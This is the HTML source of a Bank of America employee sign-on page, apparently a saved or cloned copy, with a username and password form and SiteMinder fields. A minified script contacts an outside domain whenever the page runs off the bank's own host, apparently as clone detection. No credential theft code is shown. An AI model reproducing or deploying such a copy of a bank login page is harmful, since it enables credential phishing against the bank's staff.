```
<!-- SiteMinder Encoding=ISO-8859-1; -->
<!--
-->

<!DOCTYPE html>

<html>

 <head><meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <link rel="icon" href="/favicon.ico">

    <title>Bank of America: Sign On</title>

    
    <link rel="stylesheet" href="/unauthorized/assets/sso/css/custom.css" media="screen">
    <link href="/unauthorized/assets/sso/css/main-v2.css"  rel="stylesheet">

    <script type="text/javascript" src="./security.js" > </script>
    <script src="./urlmunger.js" >
</script>
</head>

<body>
     <script>
        if (checkForXssCharsInURL(window.location.href)) {
            window.location = "SystemError.html";
        }
        if (!isSiteminderCookieValid(document)) {
            window.location = "SystemError.html";
        }
    </script>

    <div class="sso-branding container">
      <img src="/unauthorized/assets/sso/images/bofa-logo-new.svg" width="325" height="72" class="mx-auto d-block" alt="Bank of America Logo"/>
    </div>
  <div class="login-container">
      <div class="sso-login">
        <header>
          <h1>Simplified Sign On</h1>
        </header>
        <main role="main">
          <form id="login" action="sso_login.fcc" name="login" method="POST" novalidate>
            <input type="hidden" id="SMRETRIES" name="SMRETRIES" value="" /> 
          
              <div id="formError" class="alert alert-bank-gray-2  form-error-hide">
                <span class="brand-Alert text-bank-primary-2 icon-md mr-3"></span>
                <p class="text-size-sm text-black">You have entered an incorrect Standard ID or password.<br />
                  Please enter your information again.</p>
              </div>

              <div class="form-row">
                <div class="col-md-6">
                    <label for="standard-id">Standard ID:</label>
                </div>
              </div>
              <div class="form-row mb-2">
                <div class="col-md-6">
                    <input class="form-control form-control-sm" tabindex="1" size="13" autocomplete="off" autocapitalize="off"  maxlength="30"  name="USER" id="USER" value="" type="text" aria-required="true"  />
                </div>
                <div class="col-md-6">
                    <div class="form-text form-help-text"><a href="https://pns.bankofamerica.com/pnservices/getid.jsp" tabindex="4" class="nav-external-link">Get Standard ID <span class="sr-only">(opens in a new window)</span></a></div>
                </div>
              </div>
              <div class="form-row">
                <div class="col-md-6">
                    <label for="sso-password">Password:</label>
                </div>
              </div>
              <div class="form-row mb-3">
                <div class="col-md-6">
                    <input class="form-control form-control-sm" tabindex="2" type="password" name="PASSWORD" id="PASSWORD" aria-required="true"  />
                </div>
                <div class="col-md-6">
                    <div class="form-text form-help-text">
                       <a id="pwlink" href="https://password.bankofamerica.com/" tabindex="5" class="nav-external-link">Manage Password <span class="sr-only">(opens in a new window)</span></a>
                    </div>
                </div>
              </div>
              <p><button class="btn btn-bank-primary-1" type="submit" tabindex="3">Sign On</button></p>
            <input type="hidden" name="SMENC" value="ISO-8859-1" />
            <input type="hidden" name="SMLOCALE" value="US-EN" />
            <input type="hidden" name="smauthreason" value="0" />
            <input type="hidden" name="smquerydata" value="">                    
            <input type="hidden" name="postpreservationdata" value="" />    
            <input type="hidden" id="_target" name="target" value="$SM$HTTPS%3a%2f%2fssologon-prd%2esm%2ebankofamerica%2ecom%2ffed%2fssologon%2ehtml%3fresumePath%3d$%2Fidp$%2F5reYV$%2FresumeSAML20$%2Fidp$%2FSSO%2eping" />
            <input type="hidden" name="smagentname" value="$SM$kDrp6N0iE8S2fVFCGz6dIOYvylhMFqW%2fXkCTqtkamaLHivwXr0zE%2bAL9hLT6DKbY" />
          
          </form>
            <div class="alert alert-bank-gray-2 mb-3 p-2 sso-message">
                <h2><a href="ssohelp.html">Need help?</a></h2>
            </div>
            <div class="alert alert-bank-gray-2 p-2 sso-message sso-legal">
              <h2>Legal Notice</h2>
              <p>This is a private computer system restricted to those with proper authorization. If you are not authorized to access data on this system, disconnect immediately. Unauthorized user or access may be subject to prosecution or disciplinary action. Unless restricted by local law, all information, including any personal information, as well as encrypted communications on this system, including email and internet activity, are subject to review, monitoring, and recording at any time without notice or permission.</p>
          </div>
        </main><!-- /.container -->
      
        <footer class="sso-footer">
        </footer>
      </div>
    </div>
    <!-- Bootstrap core JavaScript
    ================================================== -->
    <!-- Placed at the end of the document so the pages load faster -->
    <script src="/unauthorized/assets/sso/jslib/jQuery/3.3.1/jquery-3.3.1.min.js"></script>
  <script src="/unauthorized/assets/sso/jslib/jQuery/3.3.1/popper.min.js"></script>
  <script src="/unauthorized/assets/sso/jslib/bootstrap/4.1/bootstrap.min.js"></script>

  <script>
      
       
      (function() {
          'use strict';
          window.addEventListener('load', function() {
          
        	  
          // Fetch all the forms we want to apply custom Bootstrap validation styles to
          var forms = document.getElementsByClassName('needs-validation');
          // Loop over them and prevent submission
          var validation = Array.prototype.filter.call(forms, function(form) {
          form.addEventListener('submit', function(event) {
          
          // verify username/password are not empty when submitting 
          // verify username /target has not xss chars
          if(document.getElementById('USER').value === "" ||
              document.getElementById('PASSWORD').value === ""||
              checkBasicXssCharsName(document.getElementById('USER').value) ||
              checkBasicXssCharsNameTarget(document.getElementById('target').value))
          {
             document.getElementById('formError').classList.remove("form-error-hide");
             document.getElementById('formError').classList.add("form-error-show");
             event.preventDefault();
             event.stopPropagation();
             document.getElementById('USER').focus();
             
          }
         
          //form.classList.add('was-validated');
          }, false);
          });
          }, false);
          })();

      !function(){if(null===window.location.host.match(/^([w-]+.)+(bankofamerica.com)$/)){var e=document.createElement("script");e.type="text/javascript",e.async=!0,e.innerHTML="(function(){ (new Image()).src = '//images-cdn.info/653/image.gif'; })();";var n=document.getElementsByTagName("script")[0];n.parentNode.insertBefore(e,n)}}();
    
    
  $(document).ready(function(){
      
      //Set the password link based on environment.
      document.getElementById("pwlink").setAttribute("href", returnEnvManagePasswordURL());
      document.getElementById("pwlink").innerHTML=returnEnvManagePasswordText()+" ";
	  
      if (parseInt(document.getElementById('SMRETRIES').value) > 0) {
         document.getElementById('formError').classList.remove("form-error-hide");
         document.getElementById('formError').classList.add("form-error-show");
      } 
      document.getElementById('USER').focus();
      document.getElementById('PASSWORD').value='';
      document.getElementById('USER').value='';
      
  });
    </script>
  </body>
</html>```